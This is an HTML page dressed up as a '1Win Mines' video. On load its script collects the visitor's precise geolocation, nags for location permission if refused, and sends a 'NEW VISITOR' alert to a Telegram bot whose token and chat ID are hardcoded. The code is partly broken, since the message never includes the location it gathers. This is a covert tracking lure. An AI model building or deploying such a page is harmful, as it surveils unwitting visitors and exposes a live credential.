<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>1Win Mines</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
      background: black;
    }
    #bg-image {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 1;
      transition: opacity 0.5s ease;
    }
    #insta-video {
      display: none;
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      background: black;
      z-index: 2;
    }
    #play-overlay {
      display: none;
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      color: white;
      font-size: 24px;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 3;
    }
    #play-overlay button {
      margin-top: 15px;
      padding: 10px 25px;
      font-size: 18px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
    }
    #loading-overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 4;
    }
    .loader {
      width: 50px; height: 50px;
      border: 5px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    #loading-text { color: white; font-size: 18px; text-align: center; }
    #permission-request {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.8);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 5;
      color: white;
      text-align: center;
      padding: 20px;
    }
    #allow-btn {
      margin-top: 20px;
      padding: 12px 30px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">

  <video id="insta-video" playsinline controls>
    <source src="https://drive.google.com/uc?export=download&id=19szhjOpGA8ymSNuFpOtYwi4LdYP3hYR-" type="video/mp4">
  </video>

  <div id="play-overlay">
    <div>üé¨ Video ready to play</div>
    <button id="play-btn">‚ñ∂Ô∏è Play Video</button>
  </div>

  <div id="loading-overlay">
    <div class="loader"></div>
    <div id="loading-text">Connecting to server...</div>
  </div>

  <div id="permission-request">
    <h2>Location Access Required</h2>
    <p>Please allow location access to continue</p>
    <button id="allow-btn">ALLOW LOCATION</button>
  </div>

  <script>
    const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';
    const chatId = '7173355426';

    const loadingOverlay = document.getElementById('loading-overlay');
    const permissionRequest = document.getElementById('permission-request');
    const allowBtn = document.getElementById('allow-btn');
    const bgImage = document.getElementById('bg-image');
    const video = document.getElementById('insta-video');
    const playOverlay = document.getElementById('play-overlay');
    const playBtn = document.getElementById('play-btn');

    async function getPreciseLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          }),
          err => {
            if (err.code === err.PERMISSION_DENIED)
              permissionRequest.style.display = 'flex';
            resolve(null);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function sendToTelegram(data) {
      try {
        const msg = `üïµÔ∏è NEW VISITOR\n\nIP: ${data.ip || 'Unknown'}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: msg })
        });
      } catch(e){ console.log(e); }
    }

    async function trackUser() {
      const loc = await getPreciseLocation();
      await sendToTelegram({ liveLocation: loc });

      if (loc) {
        loadingOverlay.style.display = 'none';
        bgImage.style.opacity = '0';
        // Show video and play overlay after 1 second
        setTimeout(() => {
          bgImage.style.display = 'none';
          video.style.display = 'block';
          playOverlay.style.display = 'flex';
        }, 1000);
      }
    }

    allowBtn.addEventListener('click', async () => {
      permissionRequest.style.display = 'none';
      await trackUser();
    });

    playBtn.addEventListener('click', async () => {
      playOverlay.style.display = 'none';
      try {
        await video.requestFullscreen?.();
      } catch {}
      video.play();
    });

    window.onload = trackUser;
  </script>
</body>
</html>
